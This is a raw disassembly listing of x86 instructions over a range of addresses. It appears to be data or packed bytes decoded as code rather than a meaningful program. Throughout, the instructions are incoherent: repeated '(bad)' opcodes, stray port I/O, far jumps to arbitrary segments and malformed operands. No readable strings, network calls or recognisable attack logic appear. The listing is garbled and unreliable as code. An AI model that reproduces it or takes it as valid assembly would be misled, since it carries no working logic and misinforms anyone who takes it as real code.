  445b8e:	xchg   DWORD PTR [edi-0x4],ebx
  445b91:	mov    BYTE PTR [ebp-0x3f],bh
  445b94:	pushaw 
  445b96:	pusha  
  445b97:	out    dx,al
  445b98:	sub    BYTE PTR [esi+0x6c78a0cf],ch
  445b9e:	jae    0x445bd8
  445ba0:	cmp    DWORD PTR [esp+eiz*8],esi
  445ba3:	cmp    al,0xdd
  445ba5:	stos   DWORD PTR es:[edi],eax
  445ba6:	lods   al,BYTE PTR ds:[esi]
  445ba7:	lods   al,BYTE PTR ds:[esi]
  445ba8:	(bad)  
  445ba9:	push   0x92ceaa9c
  445bae:	inc    edi
  445baf:	or     eax,0x141e4dc3
  445bb4:	jmp    0x8bae:0xac241891
  445bbb:	push   0xfc9ad7ad
  445bc0:	aas    
  445bc1:	std    
  445bc2:	mov    bh,dh
  445bc4:	je     0x445bc8
  445bc6:	in     eax,dx
  445bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445bc8:	test   BYTE PTR [eax+0x42fae082],ah
  445bce:	(bad)  
  445bcf:	fwait
  445bd0:	ror    BYTE PTR [ebp+ebx*2+0x3c],0x5b
  445bd5:	add    esi,DWORD PTR [ebp-0x46a4ac1f]
  445bdb:	jmp    0x445b83
  445bdd:	xchg   ecx,eax
  445bde:	outs   dx,BYTE PTR ds:[esi]
  445bdf:	or     DWORD PTR [ebx+ebp*2],ebx
  445be2:	aaa    
  445be3:	cs aaa 
  445be5:	cmp    ebp,DWORD PTR [eax+0x75d6e294]
  445beb:	adc    cl,BYTE PTR [ebp+0x5b0cbc88]
  445bf1:	mov    BYTE PTR [esi-0x6a8161c4],ah
  445bf7:	and    esp,DWORD PTR [edx]
  445bf9:	pop    ss
  445bfa:	lods   eax,DWORD PTR ds:[esi]
  445bfb:	dec    ebp
  445bfc:	lock outs dx,BYTE PTR ds:[esi]
  445bfe:	xor    DWORD PTR [edi],eax
  445c00:	sbb    eax,0x441e84c6
  445c05:	sbb    eax,0x94bfcf6b
  445c0a:	neg    edx
  445c0c:	popf   
  445c0d:	aaa    
  445c0e:	test   edi,esp
  445c10:	add    eax,0x38827fd7
  445c15:	shr    dh,0x1a
  445c18:	sub    esp,DWORD PTR [esi-0x78]
  445c1b:	dec    ebx
  445c1c:	cmp    ch,ch
  445c1e:	push   esi
  445c1f:	dec    edx
  445c20:	mov    ebp,0x1d5601ba
  445c25:	cmp    BYTE PTR [ebx+esi*4+0x658d9eca],dl
  445c2c:	int3   
  445c2d:	fimul  WORD PTR [eax]
  445c2f:	push   edx
  445c30:	mov    gs,WORD PTR [edi-0x52e4e6f5]
  445c36:	dec    eax
  445c37:	addr16 (bad) 
  445c3a:	mov    al,0x59
  445c3c:	sbb    DWORD PTR [eax-0x4dd8a2af],0xfe598b5
  445c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445c47:	inc    ebp
  445c48:	ins    BYTE PTR es:[edi],dx
  445c49:	cwde   
  445c4a:	add    BYTE PTR [ecx],bl
  445c4c:	mov    ebx,0xbefa6b19
  445c51:	jno    0x445c4c
  445c53:	dec    ebx
  445c54:	jl     0x445cc7
  445c56:	mov    dh,0xcf
  445c58:	(bad)  
  445c59:	aas    
  445c5a:	inc    ebx
  445c5b:	jbe    0x445ccc
  445c5d:	jge    0x445beb
  445c5f:	ror    DWORD PTR [edi-0x17],1
  445c62:	cmp    al,0xa4
  445c64:	stos   DWORD PTR es:[edi],eax
  445c65:	and    al,0x0
  445c67:	or     eax,0xf18c6525
  445c6c:	icebp  
  445c6d:	pop    es
  445c6e:	inc    edx
  445c6f:	stos   BYTE PTR es:[edi],al
  445c70:	in     al,dx
  445c71:	mov    ebp,0xe7ae5a74
  445c76:	or     BYTE PTR [eax+ebp*2+0x1c0b8192],0xaf
  445c7e:	mov    ebx,0xd62ed80f
  445c83:	in     eax,dx
  445c84:	scas   al,BYTE PTR es:[edi]
  445c85:	inc    eax
  445c86:	mov    DWORD PTR [ecx],edx
  445c88:	hlt    
  445c89:	repnz adc eax,0xf2a4083d
  445c8f:	mov    ecx,0xd0889676
  445c94:	and    eax,DWORD PTR [ebx-0x55]
  445c97:	push   eax
  445c98:	pop    edx
  445c99:	dec    ecx
  445c9a:	dec    esi
  445c9b:	adc    DWORD PTR [ecx+0x24b16660],esp
  445ca1:	and    BYTE PTR [ebx],bl
  445ca3:	sbb    esi,eax
  445ca5:	mov    DWORD PTR [ecx],ebp
  445ca7:	rol    bh,0x4b
  445caa:	push   esi
  445cab:	add    DWORD PTR [ebp+0x24059b44],esp
  445cb1:	and    cl,BYTE PTR [edx]
  445cb3:	fbld   TBYTE PTR [esp+ecx*2]
  445cb6:	ret    0x307
  445cb9:	push   0x56
  445cbb:	imul   eax,DWORD PTR [eax],0x3d15b3bf
  445cc1:	stc    
  445cc2:	mov    al,ds:0x8746aadf
  445cc7:	and    esp,eax
  445cc9:	jb     0x445d38
  445ccb:	sub    DWORD PTR [edi-0x4f],ebp
  445cce:	adc    esi,DWORD PTR [ecx-0xe]
  445cd1:	inc    eax
  445cd2:	mov    ebx,esp
  445cd4:	and    ch,BYTE PTR [eax+0x12273b60]
  445cda:	es push ecx
  445cdc:	rcl    BYTE PTR [esi+0x3e680db4],cl
  445ce2:	fadd   DWORD PTR [ebx]
  445ce4:	pop    ecx
  445ce5:	add    al,0x58
  445ce7:	pop    ss
  445ce8:	inc    ebx
  445ce9:	sbb    ecx,DWORD PTR [ecx+0x50254918]
  445cef:	enter  0x88f1,0xe3
  445cf3:	jne    0x445ccf
  445cf5:	xchg   DWORD PTR [eax-0x7f97aaf6],edi
  445cfb:	mov    dl,BYTE PTR [edx+0x2bd6184f]
  445d01:	rcl    BYTE PTR [edx+0x4e],0x10
  445d05:	adc    al,0x97
  445d07:	pop    eax
  445d08:	pop    ebp
  445d09:	pop    ss
  445d0a:	inc    edi
  445d0b:	sbb    esi,DWORD PTR [eax]
  445d0d:	into   
  445d0e:	xchg   dh,al
  445d10:	or     al,0x63
  445d12:	xchg   esi,eax
  445d13:	cs es inc ebp
  445d16:	lods   eax,DWORD PTR ds:[esi]
  445d17:	sub    BYTE PTR [ecx+0x512548d3],dh
  445d1d:	call   0x5:0xccc9dec8
  445d24:	mov    eax,ds:0x579fc241
  445d29:	push   es
  445d2a:	stos   BYTE PTR es:[edi],al
  445d2b:	sub    DWORD PTR [ecx+0x2a26380c],0xffffffef
  445d32:	ds repz jmp 0x445d45
  445d36:	xchg   DWORD PTR [eax-0x753a3cc2],edx
  445d3c:	and    DWORD PTR [ebp-0x30b4956],eax
  445d42:	bound  ebx,QWORD PTR [ebx]
  445d44:	sahf   
  445d45:	ins    DWORD PTR es:[edi],dx
  445d46:	mov    bh,0xeb
  445d48:	inc    edx
  445d49:	test   DWORD PTR ds:0xe6060edb,edi
  445d4f:	push   edi
  445d50:	mov    ch,0x5f
  445d52:	fidiv  WORD PTR [ebp+eiz*2-0x3c12f17d]
  445d59:	cmp    ebp,DWORD PTR [ecx]
  445d5b:	aam    0xd0
  445d5d:	jo     0x445dd5
  445d5f:	cmp    eax,0xb7dda5c3
  445d64:	cdq    
  445d65:	inc    eax
  445d66:	jae    0x445d8e
  445d68:	fsubp  st(7),st
  445d6a:	jmp    0xf116:0x99594adb
  445d71:	into   
  445d72:	lods   eax,DWORD PTR ds:[esi]
  445d73:	ror    DWORD PTR [edi-0x5f],1
  445d76:	xor    BYTE PTR [ebx+0x2f],dh
  445d79:	adc    al,0xec
  445d7b:	in     al,dx
  445d7c:	pop    ebp
  445d7d:	xor    dl,BYTE PTR [ebp+0x2cbac4f1]
  445d83:	outs   dx,DWORD PTR ds:[esi]
  445d84:	mov    dh,0x6e
  445d86:	cmp    dh,dh
  445d88:	je     0x445d84
  445d8a:	dec    ebx
  445d8b:	into   
  445d8c:	jecxz  0x445d5c
  445d8e:	cwde   
  445d8f:	inc    edi
  445d90:	ror    BYTE PTR [ebx],0xe
  445d93:	xchg   edx,eax
  445d94:	pop    ecx
  445d95:	jae    0x445d3a
  445d97:	lahf   
  445d98:	pop    es
  445d99:	xor    ecx,DWORD PTR [ecx*2+0x45e4ccdf]
  445da0:	xchg   esi,eax
  445da1:	scas   al,BYTE PTR es:[edi]
  445da2:	adc    eax,0x92283fe3
  445da7:	inc    bx
  445da9:	jo     0x445e0a
  445dab:	inc    edx
  445dac:	dec    BYTE PTR [edx]
  445dae:	enter  0xefd1,0x75
  445db2:	add    BYTE PTR [ecx+0x1f],al
  445db5:	aam    0xe7
  445db7:	rol    DWORD PTR [ecx-0x61],cl
  445dba:	aam    0x8f
  445dbc:	or     BYTE PTR [ebx-0x5d5442ec],0x67
  445dc3:	sbb    eax,0xf5b39c49
  445dc8:	dec    ebx
  445dc9:	jmp    0x307d:0x663ececb
  445dd0:	push   ebp
  445dd1:	and    BYTE PTR [ebx-0x597b042d],dh
  445dd7:	fldenv [ebx]
  445dd9:	sbb    BYTE PTR [ecx-0x5ed3d700],dl
  445ddf:	adc    BYTE PTR [ebx+0x656dd923],dh
  445de5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445de6:	mov    dl,0x79
  445de8:	aaa    
  445de9:	or     eax,0x47d3cf45
  445dee:	jne    0x445da5
  445df0:	je     0x445da3
  445df2:	cli    
  445df3:	push   0xf01411fc
  445df8:	sti    
  445df9:	jnp    0x445e29
  445dfb:	inc    ebp
  445dfc:	mov    bl,0xa3
  445dfe:	fisttp QWORD PTR [edi]
  445e00:	add    eax,0xb68634c8
  445e05:	jmp    0x6f04e65d
  445e0a:	pop    esp
  445e0b:	cmp    ebp,ebx
  445e0d:	shl    ebx,0xcb
  445e10:	js     0x445e17
  445e12:	repz mov ah,cl
  445e15:	aas    
  445e16:	inc    ecx
  445e17:	push   0x3b
  445e19:	loopne 0x445df7
  445e1b:	fwait
  445e1c:	sub    al,0x67
  445e1e:	not    esi
  445e20:	stos   DWORD PTR es:[edi],eax
  445e21:	test   al,0x54
  445e23:	mov    bh,BYTE PTR [edi+0x47]
  445e26:	adc    DWORD PTR [ecx-0x7e873273],ebp
  445e2c:	mov    esp,0x3128f72d
  445e31:	sub    DWORD PTR [edi+ebp*8-0x17],ecx
  445e35:	(bad)  
  445e36:	xchg   esi,eax
  445e37:	stos   BYTE PTR es:[edi],al
  445e38:	push   0xffffffb6
  445e3a:	int    0xac
  445e3c:	cmp    esp,edx
  445e3e:	dec    esp
  445e3f:	out    dx,eax
  445e40:	mov    ecx,DWORD PTR [esi-0x314ff62]
  445e46:	rcl    DWORD PTR [ebx+eiz*1+0x23d4b55a],cl
  445e4d:	xor    DWORD PTR [ebx],esp
  445e4f:	ja     0x445e85
  445e51:	pop    es
  445e52:	mov    dl,0x26
  445e54:	cmp    DWORD PTR [ecx+0x68f86a0d],edx
  445e5a:	data16 sbb bh,BYTE PTR [edx]
  445e5d:	jg     0x445e78
  445e5f:	adc    eax,0x556b0448
  445e64:	cmp    ecx,DWORD PTR [esi]
  445e66:	rol    DWORD PTR [edx+0x499a6238],1
  445e6c:	pop    esi
  445e6d:	push   0xffffff83
  445e6f:	add    eax,0x436be650
  445e74:	mov    edi,0xddb7c3e8
  445e79:	sbb    BYTE PTR [ecx+0x680a433a],bl
  445e7f:	mov    esp,DWORD PTR [eax]
  445e81:	push   edi
  445e82:	xlat   BYTE PTR ds:[ebx]
  445e83:	xlat   BYTE PTR ds:[ebx]
  445e84:	adc    al,BYTE PTR [ecx-0x52b378c1]
  445e8a:	dec    ecx
  445e8b:	mov    ds:0xe8fe322,al
  445e90:	inc    edx
  445e91:	inc    edi
  445e92:	xor    eax,0x73e843f7
  445e97:	shl    BYTE PTR [ebx+0x50aab5cb],cl
  445e9d:	inc    esp
  445e9e:	jmp    0x3bd016d9
  445ea3:	imul   eax,esi,0xb60a8550
  445ea9:	dec    edi
  445eaa:	in     eax,0xec
  445eac:	jle    0x445e74
  445eae:	xchg   edx,eax
  445eaf:	adc    bl,BYTE PTR [ecx+0x77]
  445eb2:	cld    
  445eb3:	xchg   ebx,eax
  445eb4:	or     BYTE PTR ds:0xff1f802a,0x20
  445ebb:	pop    ebp
  445ebc:	inc    ecx
  445ebd:	jae    0x445ea0
  445ebf:	mov    ds:0x9a52e458,al
  445ec4:	push   esi
  445ec5:	aas    
  445ec6:	jg     0x445f0d
  445ec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445ec9:	in     eax,0x52
  445ecb:	jmp    0xee7c6d61
  445ed0:	test   al,0xb9
  445ed2:	jmp    0x975c:0x3dd0cbe
  445ed9:	mov    ah,0xf4
  445edb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445edc:	push   edi
  445edd:	sbb    DWORD PTR [edi+0x3c1be06b],ecx
  445ee3:	pop    ebp
  445ee4:	in     eax,0x91
  445ee6:	adc    BYTE PTR [ebp+ebx*2-0x36],bh
  445eea:	sub    edi,edx
  445eec:	aaa    
  445eed:	mov    WORD PTR [esi],ds
  445eef:	mov    ecx,ds
  445ef1:	dec    eax
  445ef2:	fistp  DWORD PTR ds:0x58f333dd
  445ef8:	retf   
  445ef9:	sub    al,0x74
  445efb:	rcr    DWORD PTR [edx-0x30],cl
  445efe:	add    dh,al
  445f00:	adc    edx,edi
  445f02:	xchg   esp,eax
  445f03:	mov    BYTE PTR [esi+0x2eb709dd],al
  445f09:	mov    ah,0xfa
  445f0b:	xor    BYTE PTR [eax-0x5b],0x80
  445f0f:	xor    BYTE PTR [esi],0x69
  445f12:	pop    esp
  445f13:	mov    esi,0x71eb10bd
  445f18:	mov    dh,BYTE PTR [esp+ebp*2]
  445f1b:	orps   xmm0,xmm6
  445f1e:	cld    
  445f1f:	mov    edi,?
  445f21:	lahf   
  445f22:	popa   
  445f23:	fdiv   DWORD PTR [esi+ecx*2]
  445f26:	sbb    eax,0x9e911ecd
  445f2b:	in     al,0xc3
  445f2d:	sub    ah,BYTE PTR [eax-0x23]
  445f30:	mov    bh,0x73
  445f32:	fcom   QWORD PTR gs:[edi-0x57]
  445f36:	jecxz  0x445ec4
  445f38:	fbstp  TBYTE PTR [ebx+ecx*8-0x61]
  445f3c:	popa   
  445f3d:	(bad)  
  445f3e:	repnz mov ds:0x79fc6770,al
  445f44:	mov    edx,0x20eabab5
  445f49:	xchg   esp,eax
  445f4a:	mov    edi,DWORD PTR [esi-0x69e86cdf]
  445f50:	mov    eax,ds:0x51d387f9
  445f55:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445f57:	repnz dec esi
  445f59:	mov    bh,0xf1
  445f5b:	inc    eax
  445f5c:	add    DWORD PTR [ebp+0x7d73c206],ebx
  445f62:	sbb    DWORD PTR [ebx+0x19bb08b3],0x5c300e73
  445f6c:	nop
  445f6d:	push   ebx
  445f6e:	sbb    bh,cl
  445f70:	cmc    
  445f71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445f72:	add    BYTE PTR [ecx+0x3d],dh
  445f75:	inc    esp
  445f76:	sbb    bl,ch
  445f78:	ds push ds
  445f7a:	fstp   TBYTE PTR [edx]
  445f7c:	adc    al,0xb2
  445f7e:	xchg   esi,eax
  445f7f:	cdq    
  445f80:	inc    esi
  445f81:	and    eax,0xc0ca2a90
  445f86:	cmp    BYTE PTR [eax+0x15],ah
  445f89:	pop    edi
  445f8a:	cmp    BYTE PTR [esi],dh
  445f8c:	sbb    DWORD PTR [ebp-0x31711207],ebx
  445f92:	push   es
  445f93:	push   cs
  445f94:	mov    esi,0xdd64e63
  445f99:	inc    ebp
  445f9a:	jae    0x445faa
  445f9c:	mov    dl,0x80
  445f9e:	sbb    DWORD PTR [ebp-0x5510f594],ebx
  445fa4:	lahf   
  445fa5:	lock dec esi
  445fa7:	stc    
  445fa8:	mov    eax,0x81662050
  445fad:	es mov esp,0xca593a8e
  445fb3:	lods   al,BYTE PTR ds:[esi]
  445fb4:	lahf   
  445fb5:	ss inc ecx
  445fb7:	fwait
  445fb8:	dec    esp
  445fb9:	shl    BYTE PTR [ebp+0x14a2d562],cl
  445fbf:	or     ebp,DWORD PTR [ecx-0xf392c1a]
  445fc5:	xlat   BYTE PTR ds:[ebx]
  445fc6:	sbb    cl,BYTE PTR [ebp+edx*2-0x24]
  445fca:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  445fcc:	jle    0x445f98
  445fce:	mov    ebp,0x612e0007
  445fd3:	aaa    
  445fd4:	cld    
  445fd5:	push   0xfffffff2
  445fd7:	xor    bl,ch
  445fd9:	ins    BYTE PTR es:[edi],dx
  445fda:	and    edi,DWORD PTR [edi-0x5a30ec1a]
  445fe0:	fild   QWORD PTR [ecx-0x1f]
  445fe3:	repz (bad) 
  445fe5:	daa    
  445fe6:	test   eax,0x691e9fe4
  445feb:	mov    cl,BYTE PTR [edi-0x44c68ed4]
  445ff1:	mov    ebp,0x5f63a0ee
  445ff6:	pop    ecx
  445ff7:	sbb    al,0x47
  445ff9:	mov    ah,0x5d
  445ffb:	aas    
  445ffc:	add    eax,0x925aae77
  446001:	xchg   ebp,eax
  446002:	scas   eax,DWORD PTR es:[edi]
  446003:	and    al,0x51
  446005:	pop    ebx
  446006:	cld    
  446007:	add    eax,ecx
  446009:	rcl    bl,1
  44600b:	jg     0x44607a
  44600d:	cmp    dl,0x4c
  446010:	and    bl,dl
  446012:	xchg   ah,ch
  446014:	shr    DWORD PTR ds:0x5d01bc2,cl
  44601a:	jecxz  0x446034
  44601c:	repnz addr16 (bad) 
  44601f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446020:	push   esi
  446021:	pop    eax
  446022:	jmp    0x446077
  446024:	mov    esi,0x33bf4ab9
  446029:	aad    0xe1
  44602b:	sbb    ch,BYTE PTR [eax-0x2]
  44602e:	mov    ecx,0x9cf2073
  446033:	xchg   esp,eax
  446034:	imul   ecx,DWORD PTR [edi+0x65],0x39
  446038:	aaa    
  446039:	pop    esp
  44603a:	mov    ecx,0xa5feec92
  44603f:	jns    0x446059
  446041:	mov    esp,0x14048732
  446046:	jl     0x4460a6
  446048:	inc    ebp
  446049:	lods   al,BYTE PTR ds:[esi]
  44604a:	out    0x0,al
  44604c:	pusha  
  44604d:	jne    0x44607d
  44604f:	adc    dh,dl
  446051:	mov    ebp,0xfd6a6bed
  446056:	xchg   cl,al
  446058:	adc    ah,0x92
  44605b:	push   ebp
  44605c:	repz clc 
  44605e:	scas   al,BYTE PTR es:[edi]
  44605f:	aam    0xae
  446061:	fld    TBYTE PTR [eax-0x37]
  446064:	pop    ebp
  446065:	(bad)  
  446066:	pop    ecx
  446067:	jecxz  0x446021
  446069:	jb     0x446039
  44606b:	call   0xd1bf1a1d
  446070:	cwde   
  446071:	jge    0x446065
  446073:	jl     0x446088
  446075:	leave  
  446076:	int    0x1a
  446078:	mov    dl,0x8d
  44607a:	ins    BYTE PTR es:[edi],dx
  44607b:	out    dx,eax
  44607c:	xlat   BYTE PTR ds:[ebx]
  44607d:	pop    edi
  44607e:	ret    
  44607f:	xor    BYTE PTR [esi+0x73],ah
  446082:	inc    ebp
  446083:	data16 mov ah,0x63
  446086:	inc    eax
  446087:	lock pop esp
  446089:	adc    DWORD PTR [ecx],esi
  44608b:	mov    bl,0xbc
  44608d:	cli    
  44608e:	hlt    
  44608f:	push   0xffffff84
  446091:	inc    eax
  446092:	or     DWORD PTR [ebp-0x5118db8a],esi
  446098:	fst    DWORD PTR [edi+0x23]
  44609b:	push   es
  44609c:	dec    edx
  44609d:	mov    ecx,0x7375aee2
  4460a2:	mov    ebp,0xe9f72429
  4460a7:	add    esi,DWORD PTR [esi]
  4460a9:	(bad)  
  4460aa:	in     eax,0xa2
  4460ac:	xchg   ecx,eax
  4460ad:	test   eax,0xe56ef54e
  4460b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4460b3:	gs call 0xd39e4944
  4460b9:	mov    dh,0xbc
  4460bb:	pop    eax
  4460bc:	jp     0x4460df
  4460be:	rol    DWORD PTR [ebx+ebp*4],1
  4460c1:	fist   WORD PTR [ecx]
  4460c3:	xor    ebx,DWORD PTR ds:0x8a52cbc
  4460c9:	sub    eax,0xa2cde6cd
  4460ce:	imul   ebx,edi,0x26
  4460d1:	jp     0x446086
  4460d3:	js     0x44613f
  4460d5:	and    BYTE PTR [edx-0x67],al
  4460d8:	arpl   WORD PTR [edi+0x3d71e351],bp
  4460de:	push   ebp
  4460df:	sbb    BYTE PTR [ecx-0x16cc9188],cl
  4460e5:	and    BYTE PTR [esi+0x45],0xc0
  4460e9:	test   BYTE PTR [ebp+0x7e],ah
  4460ec:	xchg   esi,eax
  4460ed:	(bad)  
  4460ee:	sti    
  4460ef:	retf   
  4460f0:	xchg   edi,eax
  4460f1:	xchg   esi,eax
  4460f2:	ins    DWORD PTR es:[edi],dx
  4460f3:	icebp  
  4460f4:	(bad)  
  4460f5:	cli    
  4460f6:	and    DWORD PTR [edi],edi
  4460f8:	gs sbb eax,0xe2d0c9e6
  4460fe:	jns    0x446153
  446100:	(bad)  
  446102:	xor    eax,0x7e7b8a78
  446107:	imul   ecx,DWORD PTR [ecx+0x70cb183c],0x3e
  44610e:	and    eax,0x1b076e47
  446113:	adc    DWORD PTR [ebx],esi
  446115:	pop    eax
  446116:	sub    ecx,eax
  446118:	mov    esi,ecx
  44611a:	push   0xffffffcf
  44611c:	aam    0x5b
  44611e:	and    ecx,DWORD PTR [ebx+0x618996f6]
  446124:	jne    0x446108
  446126:	sub    dh,bh
  446128:	imul   ebp,DWORD PTR ss:[ebp-0x2c235a93],0xffffff81
  446130:	loope  0x4460f9
  446132:	xchg   esp,eax
  446133:	mov    al,0x3a
  446135:	stos   DWORD PTR es:[edi],eax
  446136:	jne    0x4460de
  446138:	stos   BYTE PTR es:[edi],al
  446139:	rcr    DWORD PTR [eax],1
  44613b:	dec    ebx
  44613c:	dec    eax
  44613d:	jmp    0x70fc2e36
  446142:	pop    edx
  446143:	call   0x374:0x9ea24cff
  44614a:	scas   al,BYTE PTR es:[edi]
  44614b:	ins    BYTE PTR es:[edi],dx
  44614c:	into   
  44614d:	push   0x3b28e6c8
  446152:	fwait
  446153:	add    ch,BYTE PTR [edx+0x33e55270]
  446159:	pop    ebp
  44615a:	outs   dx,DWORD PTR ds:[esi]
  44615b:	fnstcw WORD PTR [edx+eax*2-0x71]
  44615f:	pop    ss
  446160:	sbb    cl,BYTE PTR [ebx]
  446162:	addr16 pop edx
  446164:	into   
  446165:	popa   
  446166:	add    esp,esi
  446168:	sbb    ah,ch
  44616a:	lock adc cl,bl
  44616d:	test   BYTE PTR [ebp-0x12938d1b],ch
  446173:	fdivr  DWORD PTR [ebx+esi*8]
  446176:	nop
  446177:	add    DWORD PTR [edx-0x4151467b],ecx
  44617d:	test   al,0x36
  44617f:	mov    ebp,0xcc64cf14
  446184:	xacquire xchg DWORD PTR [ebx+0x5],esp
  446188:	adc    ah,BYTE PTR [edi]
  44618a:	clc    
  44618b:	sub    ebp,ecx
  44618d:	cmc    
  44618e:	xlat   BYTE PTR ds:[ebx]
  44618f:	add    BYTE PTR [esi+0x6b],dl
  446192:	stos   DWORD PTR es:[edi],eax
  446193:	mov    esp,0x6cd9ccd3
  446198:	in     eax,0x69
  44619a:	cmp    BYTE PTR [ebp+0x576379e4],ah
  4461a0:	and    ch,BYTE PTR [ebx+0x78]
  4461a3:	(bad)  [edx+ecx*1]
  4461a6:	aad    0xab
  4461a8:	mov    ch,0xf3
  4461aa:	popf   
  4461ab:	xor    BYTE PTR [ebx+0x1060737f],bh
  4461b1:	pop    DWORD PTR [edi+0x36]
  4461b4:	js     0x44615c
  4461b6:	mov    ecx,0xf5a42878
  4461bb:	jae    0x4461b0
  4461bd:	mov    al,ds:0x2c520799
  4461c2:	inc    ebx
  4461c3:	sbb    DWORD PTR [ecx+0x2],eax
  4461c6:	dec    edx
  4461c7:	inc    edx
  4461c8:	iret   
  4461c9:	xchg   ecx,eax
  4461ca:	retf   0x4e5c
  4461cd:	jbe    0x4461f2
  4461cf:	inc    edi
  4461d0:	aam    0x1f
  4461d2:	aad    0xb7
  4461d4:	xchg   ebx,eax
  4461d5:	sahf   
  4461d6:	hlt    
  4461d7:	int    0xfa
  4461d9:	fdiv   DWORD PTR [edi-0x22]
  4461dc:	sbb    esp,esi
  4461de:	fst    QWORD PTR [edi-0x3f7cc6df]
  4461e4:	int3   
  4461e5:	adc    DWORD PTR [ebx+0x8],eax
  4461e8:	cmp    DWORD PTR [edx],esp
  4461ea:	cwde   
  4461eb:	xor    ebp,DWORD PTR [bp+di]
  4461ee:	test   DWORD PTR [eax],edx
  4461f0:	aad    0xd
  4461f2:	add    eax,0xd1b1edab
  4461f7:	jb     0x4461af
  4461f9:	test   eax,0x64ed00f4
  4461fe:	jno    0x446232
  446200:	fimul  DWORD PTR [ebx-0x65]
  446203:	(bad)  
  446204:	mov    ah,0xc1
  446206:	scas   al,BYTE PTR es:[edi]
  446207:	fs pop ds
  446209:	in     eax,dx
  44620a:	leave  
  44620b:	(bad)  
  44620c:	sub    BYTE PTR [ebx-0x577d079b],dh
  446212:	retf   0x4e9c
  446215:	jnp    0x446224
  446217:	xchg   edi,eax
  446218:	icebp  
  446219:	jae    0x4461a1
  44621b:	mov    al,ds:0xac9472dc
  446220:	in     eax,dx
  446221:	dec    ebp
  446222:	xchg   BYTE PTR [edx-0x4e90a4a7],al
  446228:	xor    edx,ebp
  44622a:	inc    ecx
  44622b:	aas    
  44622c:	jno    0x4461ef
  44622e:	ins    DWORD PTR es:[edi],dx
  44622f:	mov    ebx,0x7fd1678a
  446234:	sbb    al,0xc5
  446236:	je     0x4461f3
  446238:	or     bl,BYTE PTR [edi]
  44623a:	jmp    0x4fea4f24
  44623f:	jmp    0xb7941d0c
  446244:	(bad)  
  446245:	xor    esi,DWORD PTR ds:0xb46a84cd
  44624b:	jl     0x4462b9
  44624d:	ror    BYTE PTR [esi-0x734b81a6],0x2d
  446254:	jp     0x4462ae
  446256:	mov    ebx,0xf030b4df
  44625b:	sar    bl,1
  44625d:	fwait
  44625e:	scas   al,BYTE PTR es:[edi]
  44625f:	lahf   
  446260:	push   ebp
  446261:	mov    dl,0xf4
  446263:	mov    bl,0xdc
  446265:	push   esp
  446266:	push   esp
  446267:	je     0x446294
  446269:	ret    
  44626a:	add    al,BYTE PTR [edi]
  44626c:	and    DWORD PTR ds:0xf4c5e821,eax
  446272:	js     0x446294
  446274:	mov    eax,ds:0x6df520f4
  446279:	mov    dh,0x72
  44627b:	push   ebp
  44627c:	cli    
  44627d:	mov    ebp,0xef6e81bb
  446282:	cmp    al,0xc2
  446284:	test   BYTE PTR [esi],bl
  446286:	(bad)  
  446287:	mov    esp,0x7fcde5a5
  44628c:	dec    esp
  44628e:	inc    eax
  44628f:	mov    edi,0x2cbfebe
  446294:	scas   al,BYTE PTR es:[edi]
  446295:	mov    WORD PTR [eax],fs
  446297:	or     esi,DWORD PTR [ebp+0x62]
  44629a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44629b:	scas   al,BYTE PTR es:[edi]
  44629c:	mov    eax,DWORD PTR [ebp+0x62e09e1]
  4462a2:	es (bad) 
  4462a4:	aam    0x3e
  4462a6:	stos   BYTE PTR es:[edi],al
  4462a7:	in     eax,0x92
  4462a9:	xor    al,0xe6
  4462ab:	cmp    esp,eax
  4462ad:	mov    al,0xc
  4462af:	cmc    
  4462b0:	out    dx,al
  4462b1:	(bad)  
  4462b2:	jne    0x446325
  4462b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4462b5:	dec    edi
  4462b6:	out    0xf3,eax
  4462b8:	(bad)  
  4462b9:	iret   
  4462ba:	pop    ebp
  4462bb:	push   ebx
  4462bc:	mov    edi,?
  4462be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4462bf:	std    
  4462c0:	push   ebx
  4462c1:	shl    DWORD PTR [ebx+0xa4e3024],1
  4462c7:	mov    ecx,0xc647230a
  4462cc:	out    0x28,al
  4462ce:	cmp    bh,BYTE PTR [edi]
  4462d0:	shr    DWORD PTR [edi],cl
  4462d2:	bound  eax,QWORD PTR [edx-0x42d73ed8]
  4462d8:	jo     0x446344
  4462da:	sbb    BYTE PTR [edx+0x3c],al
  4462dd:	sahf   
  4462de:	adc    dl,al
  4462e0:	sub    edi,edx
  4462e2:	push   ecx
  4462e3:	push   ecx
  4462e4:	repnz out dx,al
  4462e6:	aam    0x40
  4462e8:	icebp  
  4462e9:	pop    edx
  4462ea:	outs   dx,BYTE PTR ds:[esi]
  4462eb:	ror    DWORD PTR [edi],1
  4462ed:	ficom  WORD PTR [eax]
  4462ef:	retf   
  4462f0:	add    DWORD PTR [eax],ecx
  4462f2:	jle    0x44634f
  4462f4:	in     al,dx
  4462f5:	xchg   esp,eax
  4462f6:	in     al,0x1d
  4462f8:	pushf  
  4462f9:	leave  
  4462fa:	fistp  DWORD PTR [edx-0x20]
  4462fd:	mov    DWORD PTR [edi],eax
  4462ff:	out    dx,eax
  446300:	add    eax,0x3bbc9e1c
  446305:	adc    eax,0xf81ba292
  44630a:	mov    dl,0xee
  44630c:	add    al,0x37
  44630e:	pop    ebp
  44630f:	mov    ah,0x4e
  446311:	jo     0x4462d0
  446313:	std    
  446314:	or     DWORD PTR [esp+eiz*2],ecx
  446317:	(bad)  
  446319:	out    0xf3,eax
  44631b:	pop    ecx
  44631c:	out    0x1f,al
  44631e:	popf   
  44631f:	cs push es
  446321:	std    
  446322:	outs   dx,DWORD PTR ds:[esi]
  446323:	lods   eax,DWORD PTR ds:[esi]
  446324:	popf   
  446325:	psrlq  mm1,mm7
  446328:	(bad)  
  446329:	cmc    
  44632a:	pop    ss
  44632b:	adc    edx,DWORD PTR [eax-0x9]
